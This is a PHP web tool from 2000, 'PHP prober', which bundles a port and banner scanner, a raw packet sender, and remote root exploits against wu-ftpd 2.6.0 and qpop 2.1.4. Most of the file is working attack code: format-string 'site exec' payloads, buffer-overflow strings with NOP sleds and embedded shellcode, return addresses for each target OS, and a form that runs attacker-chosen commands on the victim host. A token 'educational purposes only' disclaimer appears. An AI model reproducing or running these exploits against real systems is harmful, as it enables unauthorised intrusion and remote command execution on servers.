<?
/*
========================================================
PHP prober by jenggo <jenggo@jenggo.karet.org>
              #karet dalnet/efnet
'First' Version - Nov 2000

FOR EDUTAINMENT ehm ... for EDUCATIONAL PURPOSES ONLY
========================================================
This is wuftpd2.6.0x and *old* qpop2.1.4 exploit ported
to PHP even php in safe mode can not stop this script to
work. It's DES password enrypted to protect it from other
ppl. search the code to find the password.

Note:
Original wuftpd exploit by tf8
Original qpop exploit by
          Miroslaw Grzybek <mig@zeus.polsl.gliwice.pl>

Bonus:
a banner multiport scanner and even custom injected packet
to any host / port you want :)

As usuall:
I not responsible for your attitudes. Use this to audit
your networks ONLY.

Todo:
In the future, PHP can be used to build custom, high verbose,
easy to use remote security audit tool etc ...
 
Other:
Any webhosting company should choose carefully what PHP functions
they offerred in php.ini.

Greetz: echo, ularkasur #karet (anyer euy ... jadi ngga ?)
*/
?>
<!doctype html public -//w3c//dtd html 4.0 transitional//en>
<html>
<head>
   <meta http-equiv=Content-Type content=text/html; charset=iso-8859-1>
   <title>PHP prober</title>
</head>
<body text=#FFFFFF bgcolor=#000000 link=#0000EF vlink=#51188E alink=#FF0000>
<font size=+1>PHP prober</font> by jenggo (luki@karet.org)
<?
#default DES encrypted pass = "bebas euy!" with salt "id"
$DESkey="idwNPt0n4sMpk";
if (crypt($k,"id") != "$DESkey") {
  echo "
  <p>
  <form action=prober.php3?i=s method=post>
    Where is Tommy ? <input type=password size=20 name=k>
    <br><p><input type=submit value=SEARCH>
  </form><br>
  ";
} else {
  echo "
  <p>
  <table BORDER=0>
  <tr>
    <td><form method=post action=prober.php3?i=s><input type=hidden name=k value=\"$k\"><input type=submit value=Scan></form></td>
    <td><form method=post action=prober.php3?i=a><input type=hidden name=k value=\"$k\"><input type=submit value=Action></form></td>
    <td><form method=post action=prober.php3?i=b><input type=hidden name=k value=\"$k\"><input type=submit value=Build></form></td>
  </tr>
  </table>
  ";

//BEGIN
function probeftp($port,$ip,$pass,$sex,$com) {
  $fp = fsockopen("$ip", $port, &$errno, &$errstr);
  set_socket_blocking($fp, true);
  if(!$fp) {
        echo "$errstr ($errno)<br>\n";
  } else {
        fputs($fp,"user ftp\n");
        fputs($fp,$pass);
        fputs($fp,$sex);
                echo fgets($fp,128);
        fputs($fp,$com);
        fputs($fp,$com);
        sleep(3);
        while(!strstr($result,"exit")) {
                $result = fgets($fp, 128);
                echo "$result <br>\n";
        }
        fclose($fp);
  }
}
function net($port,$ip) {
  $fp = fsockopen("$ip", $port, &$errno, &$errstr);
  set_socket_blocking($fp, true);
  if(!$fp) {
    echo "$errstr ($errno)<br>\n";
  } else {
    if ($port == 21){
              fputs($fp,"user ftp\r\n");
        fputs($fp,"pass ftp\r\n");
        fputs($fp,"site exec %x%x%x%x%x%p|%p%.f\r\n");
        fputs($fp,"quit\r\n");
    }
    if ($port == 80){
        fputs($fp,"HEAD / HTTP/1.0\n\n\n");
    }
    if ($port == 143){
        fputs($fp,"* logout\n");
    }
    if (($port == 23) || ($port == 22)){
 
    }
    if (($port != 21) && ($port != 23) && ($port != 22) &&($port != 80) &&($port != 143)) {
        fputs($fp,"quit\r\n");
    }
    if($port != 23) {
        while(!feof($fp)) {
          echo fgets($fp,128);
          echo "<br>\n";
        }
    } else {
          echo fgets($fp,8);
          echo "<br>\n";
    }
    fclose($fp);
  }
}
function build($port,$ip,$content){
  $fp = fsockopen("$ip", $port, &$errno, &$errstr);
  set_socket_blocking($fp, true);
  if(!$fp) {
    echo "$errstr ($errno)<br>\n";
  } else {
    fputs($fp, $content);
    while(!feof($fp)) {
      echo fgets($fp,128);
      echo "<br>\n";
    }
    fclose($fp);
  }
}
function qpop($ip,$port,$content,$execute){
  $fp = fsockopen("$ip", $port, &$errno, &$errstr);
  set_socket_blocking($fp, true);
  if(!$fp) {
    echo "$errstr ($errno)<br>\n";
  } else {
    fputs($fp, $content);
    fputs($fp, $execute);
    while (!feof($fp)) {
      $outp = fgets($fp,128);
      flush();
      echo "$outp <br>\n";
    }
    fclose($fp);
  }
}

if ($i == "a") {
  echo "
  <form action=prober.php3?i=aa method=post>
  <table BORDER WIDTH=100% NOSAVE >
  <tr NOSAVE>
  <td width=55>
  <center><b><font color=#FFCC00>ACTION PAGE</font></b></center>
  </td>
  <td></td>
  </tr>
  <tr>
  <td>Server type :</td>
  <td>
  <select name=type>
    <option value=1> wu-2.6.0(1) Mon Feb 28 - RedHat 6.2 SMP
    <option value=2> wu-2.6.0(1) Mon Feb 28 - RedHat 6.2 Zoot
    <option value=3> wu-2.6.0(1) - SUSE 6.3
    <option value=4> wu-2.6.0(1) - SUSE 6.4
    <option value=5> wu-2.6.0(1) - FreeBSD 3.4-STABLE ports
    <option value=6> wu-2.6.0(1) - FreeBSD 3.4-STABLE packages
    <option value=7> wu-2.6.0(1) - FreeBSD 3.4-RELEASE ports
    <option value=8> wu-2.6.0(1) - FreeBSD 4.0-RELEASE packages
    <option value=9> QPOP2.1.4-R3 - BSD/OS 2.1
    <option value=10> QPOP2.1.4-R3 - FreeBSD 2.2.x - 3.0
    <option value=11> QPOP2.3 - 2.4 - FreeBSD 2.2.x - 3.0
  </select>
  </td>
  </tr>
  <tr>
  <td>Command to execute :</td>
  <td><input type=text name=com size=50 value=\"ls /root;w;uname -an\"></td>
  </tr>
  <tr>
  <td>Target IP :</td>
  <td><input type=text name=ip></td>
  </tr>
  <tr>
  <td>(Optional) argument :<br> - ret addr for ftp, offset for qpop<br>(ex. \\x28\\xb0\\xff\\xff\\xbf)</td>
  <td><input type=text name=rot></td>
  </tr>
  <tr>
  <td><input type=submit value=GO-GO-GO></td>
  <td><input type=hidden name=k value=\"$k\"></td>
  </tr>
  </table>
  </form>
  ";
}
if ($i == "aa") {
  if(($type == "1") || ($type == "2") || ($type == "3") || ($type == "4")) {
    $nop = "\x90";
    // lam3r's linux shellcode
    $shellcode = "\x31\xc0\x31\xdb\x31\xc9\xb0\x46\xcd\x80\x31\xc0\x31\xdb\x43\x89\xd9\x41\xb0\x3f\xcd\x80\xeb\x6b\x5e\x31\xc0\x31\xc9\x8d\x5e\x01\x88\x46\x04\x66\xb9\xff\xff\x01\xb0\x27\xcd\x80\x31\xc0\x8d\x5e\x01\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\xb0\x0c\xcd\x80\xfe\xc9\x75\xf3\x31\xc0\x88\x46\x09\x8d\x5e\x08\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xb0\x0b\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xcd\x80\xe8\x90\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31@bebas.euy.com\x0d\x0a";
    if($type == "1") {
      $ret = "\x28\xb0\xff\xff\xbf";
      $rep = "134699076"; // 0x8075844
      $repeat = "134";
      $final = "%c%c%c%.f|%n\n";
    }
    if($type == "2") {
      $ret = "\x74\xd0\xff\xff\xbf";
      $rep = "134699076"; // 0x8075844
      $repeat = "134";
      $final = "%c%c%c%.f|%n\n";
    }                       
    if($type == "3") {
      $ret = "\x18\xb0\xff\xff\xbf";
      $rep = "134703904"; // 0x8076b20
      $repeat = "134";
      $final = "%c%c%c%.f|%n\n";
    }
    if($type == "4") {
      $ret = "\xec\xaf\xff\xff\xbf";
      $rep = "134702992"; // 0x8076790
      $repeat = "135";
      $final = "%c%c%c%.f|%n\n";
    }                                                       
  }
  if(($type == "5") || ($type == "6") || ($type == "7") || ($type == "8")) {
    $nop = "\x90";
    // Lam3rZ chroot() code rewritten for FreeBSD by venglin
    $shellcode = "\x31\xc0\x50\x50\x50\xb0\x7e\xcd\x80\x31\xdb\x31\xc0\x43\x43\x53\x4b\x53\x53\xb0\x5a\xcd\x80\xeb\x77\x5e\x31\xc0\x8d\x5e\x01\x88\x46\x04\x66\x68\xff\xff\x01\x53\x53\xb0\x88\xcd\x80\x31\xc0\x8d\x5e\x01\x53\x53\xb0\x3d\xcd\x80\x31\xc0\x31\xdb\x8d\x5e\x08\x89\x43\x02\x31\xc9\xfe\xc9\x31\xc0\x8d\x5e\x08\x53\x53\xb0\x0c\xcd\x80\xfe\xc9\x75\xf1\x31\xc0\x88\x46\x09\x8d\x5e\x08\x53\x53\xb0\x3d\xcd\x80\xfe\x0e\xb0\x30\xfe\xc8\x88\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\x52\x51\x53\x53\xb0\x3b\xcd\x80\x31\xc0\x31\xdb\x53\x53\xb0\x01\xcd\x80\xe8\x84\xff\xff\xff\xff\xff\xff\x30\x62\x69\x6e\x30\x73\x68\x31\x2e\x2e\x31\x31\x76\x65\x6e\x67\x6c\x69\x6e";
    if ($type == "5") {
      $ret = "\x64\xc1\xbf\xbf";
      $rep = "134984720";
      $repeat = "58";
      $repeat2 = "%c%c%.f%.f%.f%.f%c";
      $repeat3 = "68";
      $final = "%c%c%.f|%n\n";
    }
    if ($type == "6") {
      $ret = "\xbc\xc6\xbf\xbf";
      $rep = "134665148";
      $repeat = "131";
      $final = "%d%c%c%.f|%n\n";
    }
    if ($type == "7") {
      $ret = "\x24\xc6\xbf\xbf";
      $rep = "134892636";
      $repeat = "58";
      $repeat2 = "%c%c%.f%c%c%c%c%c%c%c%c%c%c%c%c%c%c";
      $repeat3 = "64";
      $final = "%d%c%c%.f|%n\n";
    }
    if ($type == "8") {
      $ret = "\x98\xe7\xbf\xbf";
      $rep = "134678256";
      $repeat = "157";
      $final = "%c%c%.f|%n\n";
    }

  }
  if(($type == "9") || ($type == "10") || ($type == "11")) {
    $shellcode = "\xeb\x32\x5e\x31\xdb\x89\x5e\x07\x89\x5e\x12\x89\x5e\x17\x88\x5e\x1c\x8d\x1e\x89\x5e\x0e\x31\xc0\xb0\x3b\x8d\x7e\x0e\x89\xfa\x89\xf9\xbf\x10\x10\x10\x10\x29\x7e\xf5\x89\xcf\xeb\x01\xff\x62\x61\x63\x60\xeb\x1b\xe8\xc9\xff\xff\xff/bin/sh\xaa\xaa\xaa\xaa\xff\xff\xff\xbb\xbb\xbb\xbb\xcc\xcc\xcc\xcc\x9a\xaa\xaa\xaa\xaa\x07\xaa";
    $ret = efbfd504;
    $buf = 1200;
    $com2 = $com;
    $com2 = $com2 . ";exit\r\nquit\r\n";
    $com = NULL;
    if($type == "9") {
      $offset = 1500;
    }
    if($type == "10") {
      $offset = 900;
    }
    if($type == "11") {
      $offset = 0;
    }
    if ($rot) {
      $offset = $rot;
    }
    $reta = hexdec($ret);
    $reta = $reta + $offset;
    $reta = dechex($reta);
    $retb = $retb . chr(hexdec(substr($reta,-2,2)));
    $retb = $retb . chr(hexdec(substr($reta,-4,2)));
    $retb = $retb . chr(hexdec(substr($reta,-6,2)));
    $retb = $retb . chr(hexdec(substr($reta,-8,2)));
    for ($g=0; $g < 800; $g++) {
      $com = $com . "\x90";
    }
    $com = $com . $shellcode;
    for($g=0; $g < 901 - strlen($shellcode) - 800; $g++) {
      $com = $com . "\x90";
    }
    for($g=901; $g < $buf-4; $g+=4) {
      $com = $com . $retb;
    }
    for($g=0; $g < $buf - strlen($com); $g++) {
      $com = $com . "\x90";
    }
    $com = $com . "\r\n";
//    echo "ini: $com <p> dan ini: $com2<p>";
    echo "====probing qpop on host: $ip with offset: $offset ====<p>";
    qpop($ip,110,$com,$com2);

  } 
  if(($type == "1") || ($type == "2") || ($type == "3") || ($type == "4") || ($type == "5") || ($type == "6") || ($type == "7") || ($type == "8")) {  
    // value got from user input
    if ($rot) {
      $ret = $rot;
    }
    // build pass string
    $pass = "PASS ";
    for ($i=0; $i < 280; $i++) {
      $pass = $pass . $nop;
    }
    $pass = $pass . $shellcode;
    //build site exec string
    $sex = "site exec xx";
    $sex = $sex . $ret . "%d%." . $rep . "d.f";
    for ($i=0; $i < $repeat; $i++) {
      $sex = $sex . "%.f";
    }
    if (($type == "5") || ($type == "7")) {
      $sex = $sex . $repeat2;
      for ($i=0; $i < $repeat3; $i++) {
        $sex = $sex . "%.f";
      }
    }
    $sex = $sex . $final;
    $com = "$com" . ";exit\r\n";
    probeftp(21,$ip,$pass,$sex,$com);
  }

}
if ($i == "s") {
  echo "
<form action=prober.php3?i=ss method=post>
<table BORDER COLS=2 WIDTH=100% NOSAVE >
<tr>
<td>
<center><b><font color=#FFCC00>SCAN PAGE</font></b></center>
</td>
<td></td>
</tr>
<tr>
<td>IP address(s) :<br>(use \" : \" as separator)</td>
<td><input type=text name=ip></td>
</tr>
<tr>
<td>Port(s) to scan :
<br>(use \" : \" as separator)</td>
<td><input type=text name=port value=\"21:80:110:143\"></td>
</tr>
<tr>
<td><input type=submit value=GO-GO-GO></td>
<td><input type=hidden name=k value=\"$k\"></td>
</tr>
</table>
  ";
}
if ($i == "ss") {
  $scan=explode(":", $port);
  $ip=explode(":", $ip);
  for($x=0; $x<count($ip); $x++){
    for($i=0; $i<count($scan); $i++){
    $port=$scan[$i];
    echo "\r\n<br><b>======scanning for port $port on host $ip[$x]======</b>\r\n\r\n<br>";
    net($port,$ip[$x]);
    flush();
    }
  }
}
if ($i == "b") {
  echo "
<form action=prober.php3?i=bb method=post ENCTYPE=\"multipart/form-data\">
<table BORDER WIDTH=100% NOSAVE >
<tr>
<td width=46>
<center><b><font color=#FFCC00>BUILD PAGE</font></b></center>
</td>
<td></td>
</tr>
<tr>
<td>Target IP :</td>
<td><input type=text name=ip></td>
</tr>
<tr>
<td>Port :</td>
<td><input type=text name=port></td>
</tr>
<tr>
<td>Content1 :&nbsp;
<br>(Using \\x hex format)</td>
<td><input type=text name=content1 size=50></td>
</tr>
<tr>
<td>Content2 :&nbsp;
<br>(Using \\x hex format)</td>
<td><input type=text name=content2 size=50></td>
</tr>

<tr>
<td><input type=submit value=GO-GO-GO></td>
<td><input type=hidden name=k value=\"$k\"></td>
</tr>
</table>
  ";
}
if ($i == "bb") {
  echo "====The results on host $ip with port: $port is : ==== <p>";
  $len1 = strlen($content1) / 4;
  $content = explode("\\x", $content1);
  for($g=0; $g < $len1; $g++) {
    $con1 = $con1 . chr(dechex($content[$g]));
  }
  if ($content2) {
    $len2 = strlen($content2) /4;
    $content = explode("\\x", $content2);
    for($g=0; $g < $len2; $g++) {
      $con1 = $con1 . chr(dechex($content[$g]));
    }
  }
  // just a precautions if you forgot to put exit string to avoid 'hang up' forever, 
  // we use set_socket_blocking = true remember ?
  $con1 = $con1 . "\r\nquit\r\nexit\r\nlogout\r\n";
  build($port,$ip,$con1);
}
}
?>
<center>
<p><p>For Edutainment Purpose Only :P
<br>jenggo @2000 Production</center>

</body>
</html>
